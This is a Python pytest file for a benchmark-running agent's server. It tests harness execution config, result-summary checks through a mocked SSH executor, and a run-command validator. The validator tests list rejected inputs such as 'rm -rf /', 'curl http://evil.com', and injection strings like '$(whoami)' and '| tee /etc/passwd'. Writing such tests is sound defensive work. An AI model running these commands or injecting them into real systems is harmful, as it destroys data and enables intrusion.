from __future__ import annotations

import json
from dataclasses import dataclass

import pytest

from agents.benchmark.server import _validate_run_command
from providers.skills.base import RunfileTemplate
from tests.conftest import MockSkillProvider, MockSSHExecutor, make_benchmark_handlers


@pytest.fixture
def mock_provider() -> MockSkillProvider:
    return MockSkillProvider(
        private_config={
            "crucible": {
                "execution": {
                    "controller_required": True,
                    "run_command": "crucible run",
                    "endpoint_type": "remotehosts",
                    "endpoint_user": "root",
                    "default_userenv": "alma8",
                    "default_osruntime": "podman",
                    "pre_run": ["ssh_key_setup"],
                    "run_file_format": "json",
                    "results_dir_pattern": "/var/lib/crucible/run/*",
                },
            },
            "zathras": {
                "execution": {
                    "controller_required": True,
                    "run_command": "/opt/zathras/bin/burden",
                    "endpoint_type": "local",
                    "endpoint_user": "root",
                    "pre_run": ["ssh_key_setup"],
                    "run_file_format": "yaml_scenario",
                    "results_dir_pattern": "/tmp/results_*",
                },
            },
        },
        runfile_template=RunfileTemplate(
            benchmark="fio", template={"harness": "crucible"}
        ),
    )


@pytest.fixture
def handlers(mock_provider):
    return make_benchmark_handlers(
        ssh=MockSSHExecutor(),
        skill_provider=mock_provider,
    )


@pytest.mark.asyncio
async def test_get_execution_config_crucible(handlers):
    result = await handlers["get_execution_config"](harness_name="crucible")
    assert result["found"] is True
    assert result["harness"] == "crucible"
    assert result["run_command"] == "crucible run"
    assert result["run_file_format"] == "json"
    assert result["default_userenv"] == "alma8"


@pytest.mark.asyncio
async def test_get_execution_config_zathras(handlers):
    result = await handlers["get_execution_config"](harness_name="zathras")
    assert result["found"] is True
    assert result["harness"] == "zathras"
    assert result["run_command"] == "/opt/zathras/bin/burden"
    assert result["run_file_format"] == "yaml_scenario"


@pytest.mark.asyncio
async def test_get_execution_config_not_found(handlers):
    result = await handlers["get_execution_config"](harness_name="unknown_harness")
    assert result["found"] is False


@pytest.mark.asyncio
async def test_no_generate_run_file_tool(handlers):
    assert "generate_run_file" not in handlers


@pytest.mark.asyncio
async def test_no_validate_run_file_tool(handlers):
    assert "validate_run_file" not in handlers


# ── result-summary.json verification tests ──────────────────


@dataclass
class _FakeSSHResult:
    exit_code: int = 0
    stdout: str = ""
    stderr: str = ""


RUN_DIR = "/var/lib/crucible/run/uperf--abc12345-1234-5678-9abc-def012345678"
SUMMARY_JSON = json.dumps({"result": "pass", "primary_metric": "Gb_sec"})


async def _make_crucible_ssh(
    *,
    run_exit_code: int = 0,
    run_stdout: str = "",
    summary_found: bool = True,
    summary_content: str = SUMMARY_JSON,
    log_content: str = "some log output",
):
    """Build a mock SSH executor that simulates crucible run + result check."""

    async def _run(host, command, timeout=300):
        if "crucible-valkey" in command:
            return _FakeSSHResult(exit_code=0, stdout="OK")
        if "crucible-opensearch" in command:
            return _FakeSSHResult(exit_code=0, stdout="GONE")
        if "crucible start opensearch" in command:
            return _FakeSSHResult(exit_code=0, stdout="Successfully started OpenSearch")
        if "result-summary.json" in command:
            if summary_found:
                return _FakeSSHResult(exit_code=0, stdout=summary_content)
            return _FakeSSHResult(exit_code=1, stdout="")
        if "crucible.log" in command:
            return _FakeSSHResult(exit_code=0, stdout=log_content)
        return _FakeSSHResult(exit_code=0, stdout="ok")

    async def _run_with_progress(host, command, progress_callback=None):
        return _FakeSSHResult(
            exit_code=run_exit_code,
            stdout=f"run directory: {RUN_DIR}\n" + (run_stdout or ""),
        )

    async def _copy_to(host, local_path, remote_path, timeout=60):
        return _FakeSSHResult(exit_code=0)

    class _Mock:
        pass

    m = _Mock()
    m.run = _run
    m.run_with_progress = _run_with_progress
    m.copy_to = _copy_to
    return m


def _make_crucible_handlers(mock_ssh):
    """Create benchmark handlers with a mocked SSH executor."""
    provider = MockSkillProvider(
        private_config={
            "crucible": {
                "execution": {
                    "controller_required": True,
                    "run_command": "crucible run",
                },
            },
        },
        runfile_template=RunfileTemplate(
            benchmark="fio", template={"harness": "crucible"}
        ),
    )

    return make_benchmark_handlers(ssh=mock_ssh, skill_provider=provider)


@pytest.mark.asyncio
async def test_crucible_missing_result_summary_marks_failed():
    """Exit code 0 but no result-summary.json → status must be 'failed'."""
    mock_ssh = await _make_crucible_ssh(
        run_exit_code=0,
        summary_found=False,
        log_content="indexing failed: connection refused",
    )
    h = _make_crucible_handlers(mock_ssh)

    result = await h["execute_benchmark"](
        controller="test-host",
        run_file={"benchmarks": []},
        harness="crucible",
        run_command="crucible run",
    )

    assert result["status"] == "failed"
    assert "result-summary.json" in result["message"]
    assert "run_log" in result
    assert "indexing failed" in result["run_log"]
    assert "result_summary" not in result


@pytest.mark.asyncio
async def test_crucible_with_result_summary_marks_completed():
    """Exit code 0 with result-summary.json → status must be 'completed'."""
    mock_ssh = await _make_crucible_ssh(
        run_exit_code=0,
        summary_found=True,
    )
    h = _make_crucible_handlers(mock_ssh)

    result = await h["execute_benchmark"](
        controller="test-host",
        run_file={"benchmarks": []},
        harness="crucible",
        run_command="crucible run",
    )

    assert result["status"] == "completed"
    assert "result_summary" in result
    assert result["result_summary"]["result"] == "pass"


class TestValidateRunCommand:
    """Tests for _validate_run_command — issue #140."""

    @pytest.mark.parametrize(
        "run_command,harness",
        [
            ("crucible run", "crucible"),
            ("crucible", "crucible"),
            ("/usr/local/bin/crucible", "crucible"),
            ("burden", "zathras"),
            ("/opt/zathras/bin/burden", "zathras"),
            ("kube-burner init", "kube-burner"),
            ("vstorm", "vstorm"),
            ("/opt/vstorm/vstorm", "vstorm"),
            ("run_cli", "forge"),
            ("/opt/forge/bin/run_cli", "forge"),
            ("clusterbuster", "clusterbuster"),
            ("k8s-netperf", "k8s-netperf"),
        ],
    )
    def test_allowed_harness_binaries(self, run_command, harness):
        allowed, reason = _validate_run_command(run_command, harness)
        assert allowed, f"Should be allowed: {run_command!r} for {harness}: {reason}"

    @pytest.mark.parametrize(
        "run_command,harness",
        [
            ("bash -c 'rm -rf /'", "crucible"),
            ("ssh root@host 'ip addr'", "crucible"),
            ("rm -rf /tmp", "zathras"),
            ("python3 -c 'print(1)'", "kube-burner"),
            ("curl http://evil.com", "vstorm"),
        ],
    )
    def test_reject_arbitrary_binaries(self, run_command, harness):
        allowed, reason = _validate_run_command(run_command, harness)
        assert not allowed
        assert "not allowed" in reason

    @pytest.mark.parametrize(
        "run_command",
        [
            "crucible run; rm -rf /",
            "crucible run && curl evil.com",
            "crucible run || bash",
            "crucible run $(whoami)",
            "crucible run `id`",
            "crucible run | tee /etc/passwd",
        ],
    )
    def test_reject_shell_injection(self, run_command):
        allowed, reason = _validate_run_command(run_command, "crucible")
        assert not allowed
        assert "shell metacharacters" in reason

    def test_reject_unknown_harness(self):
        allowed, reason = _validate_run_command("some-binary", "unknown-harness")
        assert not allowed
        assert "Unknown harness" in reason

    def test_reject_empty_command(self):
        allowed, reason = _validate_run_command("", "crucible")
        assert not allowed

    def test_cross_harness_binary_rejected(self):
        allowed, _ = _validate_run_command("burden", "crucible")
        assert not allowed
        allowed, _ = _validate_run_command("crucible", "zathras")
        assert not allowed


@pytest.mark.asyncio
async def test_get_tool_params_found():
    provider = MockSkillProvider(
        tool_params={
            "sysstat": {
                "presets": {"defaults": {"interval": "3", "subtools": "mpstat,sar"}},
                "validations": {"interval": {"type": "positive_integer"}},
            }
        },
        tool_metadata={
            "sysstat": {
                "description": "Wrapper for sar, mpstat, iostat, pidstat",
            }
        },
    )
    h = make_benchmark_handlers(ssh=MockSSHExecutor(), skill_provider=provider)
    res = await h["get_tool_params"](tool="sysstat", harness="crucible")
    assert res["found"] is True
    assert res["tool"] == "sysstat"
    assert res["harness"] == "crucible"
    assert res["params"]["presets"]["defaults"]["interval"] == "3"
    assert res["metadata"]["description"] == "Wrapper for sar, mpstat, iostat, pidstat"


@pytest.mark.asyncio
async def test_get_tool_params_not_found():
    provider = MockSkillProvider()
    h = make_benchmark_handlers(ssh=MockSSHExecutor(), skill_provider=provider)
    res = await h["get_tool_params"](tool="nonexistent_tool", harness="crucible")
    assert res["found"] is False
    assert "No parameter definitions or metadata" in res["message"]
